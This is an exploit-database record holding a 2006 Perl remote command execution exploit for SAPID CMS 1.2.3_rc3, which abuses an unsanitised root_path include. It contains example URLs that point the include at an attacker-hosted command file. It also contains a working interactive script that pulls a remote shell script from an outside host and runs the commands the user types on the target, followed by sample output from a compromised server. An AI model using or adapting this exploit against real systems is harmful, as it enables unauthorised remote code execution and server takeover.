{
  "id": "2161",
  "title": "SAPID CMS 1.2.3_rc3 - &#039;rootpath&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#########################################################################\r\n# Title: SAPID CMS Multiple remote Command Execution Vulnerabilities\r\n#\r\n# Author: Simo64 <simo64_at_morx_org>\r\n# \r\n# Discovered: 06 Aout 2006\r\n# \r\n# Published : 08 Aout 2006\r\n# \r\n# MorX Security Research Team\r\n# \r\n# http://www.morx.org\r\n# \r\n# Vendor : SAPID CMS\r\n#\r\n# Version : 123 rc3 ()\r\n# \r\n# Website : http://sapid.sourceforge.net\r\n# \r\n# Severity: Critical\r\n# \r\n# Details: \r\n# \r\n# \r\n# [+] Remote File Inclusion\r\n# \r\n# 1) vulnerable code in usr/extensions/get_infochannel.inc.php lines( 8 - 9 )\r\n# \r\n# if(!defined(\"common_extfunctions\")) { define(\"common_extfunctions\", \"loaded\");\r\n# include($root_path.\"usr/system/common_extfunctions.inc.php\"); }\r\n#\r\n# 2) vulnerable code in usr/extensions/get_tree.inc.php lines( 9 - 10 )\r\n#\r\n# if(!defined(\"common_extfunctions\")) { define(\"common_extfunctions\", \"loaded\");\r\n# include($GLOBALS[\"root_path\"].\"usr/system/common_extfunctions.inc.php\"); }\r\n#\r\n# $root_path , $GLOBALS[\"root_path\"] variable are not sanitized ,before it can be used to include files\r\n# \r\n# [-] Exploit : \r\n# \r\n# http://localhost/usr/extensions/get_infochannel.inc.php?root_path=http://attacker/cmd.txt?cmd=id;pwd\r\n# \r\n# http://localhost/usr/extensions/get_tree.inc.php?GLOBALS[\"root_path\"]=http://attacker/cmd.txt?cmd=id;pwd\r\n#\r\n#======================================\r\n# Poc Remote Command Execution Exploit:\r\n#======================================\r\n#\r\n# http://www.morx.org/sapid.txt\r\n#\r\n# C:\\>perl sapid.pl http://127.0.0.1\r\n#\r\n# ===============================================================\r\n# =  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =\r\n# ===============================================================\r\n# =       MorX Security Research Team - www.morx.org            =\r\n# =       Coded by Simo64 - simo64@www.morx.org                 =\r\n# ===============================================================\r\n\r\n# simo64@morx.org :~$ id; ls\r\n# uid=48(apache) gid=48(apache) groups=48(apache)\r\n# get_calendar.inc.php\r\n# get_filter_list.inc.php\r\n# get_gb_records.inc.php\r\n# get_infochannelfilter.inc.php\r\n# get_infochannel.inc.php\r\n# get_rss.inc.php\r\n# get_searchresults.inc.php\r\n# get_survey.inc.php\r\n# get_track.inc.php\r\n# get_tree.inc.php\r\n# soap_call.inc.php\r\n# simo64@morx.org :~$ exit\r\n\r\n# Enjoy !\r\n#\r\n#!/usr/bin/perl\r\n\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n===============================================================\\n\";\r\nprint \"=  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =\\n\";\r\nprint \"===============================================================\\n\";\r\nprint \"=       MorX Security Research Team - www.morx.org            =\\n\";\r\nprint \"=       Coded by Simo64 - simo64\\@www.morx.org                 =\\n\"; \r\nprint \"===============================================================\\n\\n\";\r\n\r\nmy $targ,$rsh,$path,$con,$cmd,$data,$getit ;\r\n\r\n$targ = $ARGV[0];\r\n$rsh  = $ARGV[1];\r\n\r\nif(!$ARGV[1]) {$rsh = \"http://zerostag.free.fr/sh.txt\";}\r\n\r\nif(!@ARGV) { &usage;exit(0);}\r\n\r\n\t$targ = $ARGV[0];\r\n\t\r\n\r\n\t\r\n\tchomp($targ);\r\n    chomp($rsh);\r\n    \r\n\t$path = $targ.\"/usr/extensions/get_infochannel.inc.php\";\r\n\t$con  = get($path) || die \"[-]Cannot connect to Host\"; \r\n\r\nsub usage(){\r\n\tprint \"Usage    : perl $0 host/path [OPTION]\\n\\n\";\r\n\tprint \"Exemples : perl $0 http://127.0.0.1\\n\";\r\n\tprint \"           perl $0 http://127.0.0.1 http://yoursite/yourcmd.txt\\n\\n\";\r\n\t}\r\n\r\nwhile ()  \r\n{  \r\n\t print \"simo64\\@morx.org :~\\$ \";\r\n\t chomp($cmd=<STDIN>);\r\n     if ($cmd eq \"exit\") { print \"\\nEnjoy !\\n\\n\";exit(0);}\r\n     $getit = $path.\"?root_path=\".$rsh.\"?&cmd=\".$cmd;\r\n     $data=get($getit);\r\n     if($cmd eq \"\"){ print \"Please enter command !\\n\"; }\r\n     else{ print $data ;}\r\n}\r\n\r\n# milw0rm.com [2006-08-10]",
  "url": "https://www.exploit-db.com/exploits/2161"
}